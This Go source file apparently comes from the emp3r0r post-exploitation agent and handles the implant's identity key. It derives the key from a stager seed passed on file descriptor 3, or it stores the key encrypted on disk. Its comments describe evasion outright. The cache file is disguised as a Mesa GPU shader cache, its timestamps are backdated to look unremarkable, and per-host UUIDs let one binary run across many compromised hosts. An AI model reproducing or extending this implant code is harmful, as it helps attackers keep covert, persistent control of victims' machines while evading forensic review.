package agentutils

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/hkdf"
	"crypto/rand"
	"crypto/sha256"
	"crypto/x509"
	"fmt"
	"io"
	"encoding/base64"
	"encoding/json"
	"os"
	"strings"
	"path/filepath"
	"sync"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

var (
	// AgentKey is the unique ephemeral key for this agent session
	AgentKey     *ecdsa.PrivateKey
	agentKeyMu   sync.RWMutex
	agentKeyOnce sync.Once
)

func setAgentKey(key *ecdsa.PrivateKey) {
	agentKeyMu.Lock()
	AgentKey = key
	agentKeyMu.Unlock()
}

// AgentPrivateKey returns the current agent private key, generating it if needed.
func AgentPrivateKey() (*ecdsa.PrivateKey, error) {
	if err := GetAgentKey(); err != nil {
		return nil, err
	}

	agentKeyMu.RLock()
	key := AgentKey
	agentKeyMu.RUnlock()
	if key == nil {
		return nil, fmt.Errorf("agent key is nil")
	}

	return key, nil
}

// GetAgentKey generates the agent key, persisting it across restarts.
// It uses sync.Once to ensure the key persists for the process lifetime
// (critical for stagers/shellcode stability).
//
// Key sourcing order:
//  1. already loaded in-process
//  2. stager seed (FD 3) — stagers must be deterministic, never touch disk
//  3. encrypted local cache (see keyCachePath) — survives restarts so the
//     CC's TOFU pin stays valid and a restart needs no operator-side forget
//  4. fresh random key (previous behavior; also the fallback when load/save
//     fails) — its loss re-keys the identity, requiring an operator forget
func GetAgentKey() error {
	agentKeyMu.RLock()
	if AgentKey != nil {
		agentKeyMu.RUnlock()
		return nil
	}
	agentKeyMu.RUnlock()

	var err error
	agentKeyOnce.Do(func() {
		agentKeyMu.RLock()
		if AgentKey != nil {
			agentKeyMu.RUnlock()
			return
		}
		agentKeyMu.RUnlock()

		// If running under stager, try to derive key from injected seed (FD 3)
		if common.RuntimeConfig != nil && common.RuntimeConfig.IsRunByStager {
			// Standard "Seed" FD is 3
			seedFile := os.NewFile(uintptr(3), "loader_seed_fd")
			if seedFile != nil {
				seed := make([]byte, 32)
				n, readErr := io.ReadFull(seedFile, seed)
				seedFile.Close() // Close immediately

				if readErr == nil && n == 32 {
					// Use SHA256 of seed for logging to avoid leaking raw seed while allowing verification
					seedHash := sha256.Sum256(seed)
					logging.Infof("Deriving agent key from stager seed (FD 3, hash: %x)...", seedHash[:8])

					// Use HKDF-SHA256 to derive fixed key material from the seed.
					derivedBytes, err := hkdf.Key(sha256.New, seed, nil, "host identity verification", 32)
					if err != nil {
						logging.Warningf("Failed to derive key material with HKDF: %v", err)
						return
					}

					// Parse via ecdsa API to avoid touching deprecated raw key fields.
					parsedKey, parseErr := ecdsa.ParseRawPrivateKey(elliptic.P256(), derivedBytes)
					if parseErr != nil {
						logging.Warningf("Failed to derive ECDSA key from seed: %v, falling back to random", parseErr)
					} else {
						setAgentKey(parsedKey)

						// Log public key thumbprint for verification
						pubKeyBytes, _ := x509.MarshalPKIXPublicKey(&parsedKey.PublicKey)
						pubKeyHash := sha256.Sum256(pubKeyBytes)
						logging.Infof("Agent key derived from seed successfully. Public key thumbprint: %x", pubKeyHash[:8])
						return // Success
					}
				} else {
					logging.Warningf("Failed to read seed from FD 3 (n=%d, err=%v), falling back to random", n, readErr)
				}
			} else {
				logging.Warningf("FD 3 not available, falling back to random")
			}

			// If we are here, we failed to get key from seed or not running by stager logic didn't work as expected
			// If IsRunByStager is true, we should probably have failed hard if stealth is critical?
			// But for reliability, fallback is safer.
			// Ideally stager ALWAYS provides FD 3.
		}

		// Try the encrypted local cache first: a restart reuses the pinned
		// identity instead of invalidating it (operator would have to forget).
		if !keyPersistDisabled() {
			if cached, loadErr := loadCachedAgentKey(); loadErr == nil && cached != nil {
				setAgentKey(cached)
				logging.Infof("Agent key restored from local cache (identity stable across restarts)")
				return
			}
		}

		logging.Infof("Generating ephemeral agent key (PFS enabled)...")
		generatedKey, keyErr := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
		err = keyErr
		if keyErr == nil {
			setAgentKey(generatedKey)
			// persist for restarts; failure only means the old behavior
			// (fresh key per process, operator forgets on restart)
			if !keyPersistDisabled() {
				if saveErr := saveCachedAgentKey(generatedKey); saveErr != nil {
					logging.Debugf("agent key cache: %v", saveErr)
				}
			}
		}
	})

	if err != nil {
		return fmt.Errorf("failed to generate ephemeral key: %v", err)
	}
	return nil
}

// RenewAgentKey force-regenerates the ephemeral agent key.
// Primarily used for testing key rotation scenarios.
func RenewAgentKey() error {
	logging.Infof("Renewing ephemeral agent key...")
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return fmt.Errorf("failed to renew ephemeral key: %v", err)
	}
	setAgentKey(key)
	// keep the cache in sync — otherwise the next restart resurrects the
	// OLD key while the CC has already pinned the new one. Note a renewed
	// key invalidates the CC's TOFU pin either way: an operator forget is
	// expected after a deliberate rekey.
	if !keyPersistDisabled() {
		if saveErr := saveCachedAgentKey(key); saveErr != nil {
			logging.Debugf("agent key cache: %v", saveErr)
		}
	}
	return nil
}

// keyCachePath returns the encrypted-identity cache file. A plausible,
// host-stable path under the user's cache dir: single-file GPU shader
// cache artifacts of this shape really exist, and the content is AES-GCM
// ciphertext anyway. 0600 + backdated mtime (util.BackdateFile) keep it
// unremarkable; the encryption key is derived from the embedded config
// password + agent UUID, so the blob is useless without the binary.
func keyCachePath() (string, error) {
	home, err := os.UserHomeDir()
	if err != nil || home == "" {
		home = os.TempDir()
	}
	return filepath.Join(home, ".cache", "mesa_shader_cache_db"), nil
}

// keyCacheKEK derives the file-encryption key from material that is already
// embedded in the agent: the config password and the agent UUID.
func keyCacheKEK() ([]byte, error) {
	if common.RuntimeConfig == nil {
		return nil, fmt.Errorf("runtime config not ready")
	}
	material := common.RuntimeConfig.Password + "|" + common.RuntimeConfig.AgentUUID
	return hkdf.Key(sha256.New, []byte(material), []byte("emp3r0r-agent-key-cache-v1"), "agent identity persistence", 32)
}

func keyPersistDisabled() bool {
	if os.Getenv("EMP_NO_KEY_PERSIST") != "" {
		return true
	}
	// Never let a test binary touch the operator's real key cache: a test
	// run that reaches the identity path would fail the KEK decrypt (its
	// runtime config differs), generate a fresh key, and silently overwrite
	// the cached identity — every later restart then fails the CC's pin
	// (observed 2026-09-20: one `go test ./internal/agent/...` run broke
	// the running fleet).
	if strings.HasSuffix(os.Args[0], ".test") || strings.Contains(filepath.Base(os.Args[0]), ".test") {
		return true
	}
	return false
}

// saveCachedAgentKey encrypts the private key (PKCS#8) with AES-GCM and
// writes it to the cache file with a backdated mtime.
func saveCachedAgentKey(key *ecdsa.PrivateKey) error {
	path, err := keyCachePath()
	if err != nil {
		return err
	}
	kek, err := keyCacheKEK()
	if err != nil {
		return err
	}
	der, err := x509.MarshalPKCS8PrivateKey(key)
	if err != nil {
		return err
	}
	block, err := aes.NewCipher(kek)
	if err != nil {
		return err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return err
	}
	blob := gcm.Seal(nonce, nonce, der, nil)
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		return err
	}
	if err := os.WriteFile(path, blob, 0o600); err != nil {
		return err
	}
	util.BackdateFile(path, 20, 180)
	return nil
}

// loadCachedAgentKey reads and decrypts the identity cache. Any failure
// (missing, corrupt, wrong KEK) falls back to a fresh key.
func loadCachedAgentKey() (*ecdsa.PrivateKey, error) {
	path, err := keyCachePath()
	if err != nil {
		return nil, err
	}
	blob, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	kek, err := keyCacheKEK()
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(kek)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	if len(blob) < gcm.NonceSize() {
		return nil, fmt.Errorf("key cache too short")
	}
	der, err := gcm.Open(nil, blob[:gcm.NonceSize()], blob[gcm.NonceSize():], nil)
	if err != nil {
		return nil, err
	}
	parsed, err := x509.ParsePKCS8PrivateKey(der)
	if err != nil {
		return nil, err
	}
	key, ok := parsed.(*ecdsa.PrivateKey)
	if !ok {
		return nil, fmt.Errorf("not an ECDSA key")
	}
	return key, nil
}

// hostIdentityCache is the v2 key-cache payload: the session key plus the
// per-host UUID minted in multi-host mode. JSON-framed inside the same
// AES-GCM envelope; legacy blobs (raw PKCS8 DER) still load as key-only.
type hostIdentityCache struct {
	HostUUID string `json:"host_uuid"`
	DER      []byte `json:"der"`
}

// loadCachedIdentity restores the key and (if present) the per-host UUID.
func loadCachedIdentity() (*ecdsa.PrivateKey, string, error) {
	path, err := keyCachePath()
	if err != nil {
		return nil, "", err
	}
	blob, err := os.ReadFile(path)
	if err != nil {
		return nil, "", err
	}
	kek, err := keyCacheKEK()
	if err != nil {
		return nil, "", err
	}
	block, err := aes.NewCipher(kek)
	if err != nil {
		return nil, "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, "", err
	}
	if len(blob) < gcm.NonceSize() {
		return nil, "", fmt.Errorf("key cache too short")
	}
	plain, err := gcm.Open(nil, blob[:gcm.NonceSize()], blob[gcm.NonceSize():], nil)
	if err != nil {
		return nil, "", err
	}
	// v2: JSON envelope; legacy: raw PKCS8 DER (no host UUID)
	var v2 hostIdentityCache
	if jsonErr := json.Unmarshal(plain, &v2); jsonErr == nil && len(v2.DER) > 0 {
		parsed, perr := x509.ParsePKCS8PrivateKey(v2.DER)
		if perr == nil {
			if key, ok := parsed.(*ecdsa.PrivateKey); ok {
				return key, v2.HostUUID, nil
			}
		}
	}
	parsed, err := x509.ParsePKCS8PrivateKey(plain)
	if err != nil {
		return nil, "", err
	}
	key, ok := parsed.(*ecdsa.PrivateKey)
	if !ok {
		return nil, "", fmt.Errorf("not an ECDSA key")
	}
	return key, "", nil
}

// ApplyHostIdentity mints/restores the per-host UUID in multi-host mode.
// ONE binary then deploys to MANY hosts: each first run derives a fresh
// UUID (bound to this host's session key via the shared cache), so the
// CC's TOFU pin never sees two hosts claiming one UUID. Runs BEFORE any
// consumer of RuntimeConfig.AgentUUID (Tag, sysinfo, MsgAuth).
func ApplyHostIdentity() {
	if common.RuntimeConfig == nil || !common.RuntimeConfig.MultiHost {
		return
	}
	if err := GetAgentKey(); err != nil {
		logging.Errorf("ApplyHostIdentity: key: %v", err)
		return
	}
	key, err := AgentPrivateKey()
	if err != nil {
		return
	}
	// restore host UUID if the cache already carries one
	if !keyPersistDisabled() {
		if cached, hostUUID, loadErr := loadCachedIdentity(); loadErr == nil && cached != nil && hostUUID != "" {
			common.RuntimeConfig.AgentUUID = hostUUID
			logging.Infof("Host identity restored: %s (parent build %s)", hostUUID, common.RuntimeConfig.AgentUUIDParent)
			return
		}
	}
	// first run on this host: mint a fresh UUID and persist key+uuid together
	hostUUID := uuid.NewString()
	common.RuntimeConfig.AgentUUID = hostUUID
	if !keyPersistDisabled() {
		if saveErr := saveCachedIdentity(key, hostUUID); saveErr != nil {
			logging.Debugf("host identity cache: %v", saveErr)
		}
	}
	logging.Infof("Multi-host mode: derived per-host UUID %s (parent build %s)", hostUUID, common.RuntimeConfig.AgentUUIDParent)
}

// saveCachedIdentity persists key + host UUID as the v2 JSON envelope.
func saveCachedIdentity(key *ecdsa.PrivateKey, hostUUID string) error {
	der, err := x509.MarshalPKCS8PrivateKey(key)
	if err != nil {
		return err
	}
	return writeKeyCacheBlob([]byte(fmt.Sprintf(`{"host_uuid":%q,"der":"%s"}`, hostUUID, base64.StdEncoding.EncodeToString(der))))
}

// writeKeyCacheBlob encrypts and stores a key-cache payload (shared by both formats).
func writeKeyCacheBlob(plain []byte) error {
	path, err := keyCachePath()
	if err != nil {
		return err
	}
	kek, err := keyCacheKEK()
	if err != nil {
		return err
	}
	block, err := aes.NewCipher(kek)
	if err != nil {
		return err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return err
	}
	blob := gcm.Seal(nonce, nonce, plain, nil)
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		return err
	}
	if err := os.WriteFile(path, blob, 0o600); err != nil {
		return err
	}
	util.BackdateFile(path, 20, 180)
	return nil
}

// SignWithAgentKey signs data with the agent's unique key
func SignWithAgentKey(data []byte) ([]byte, error) {
	key, err := AgentPrivateKey()
	if err != nil {
		return nil, fmt.Errorf("get key: %v", err)
	}
	return transport.SignJSONWithKey(key, data)
}

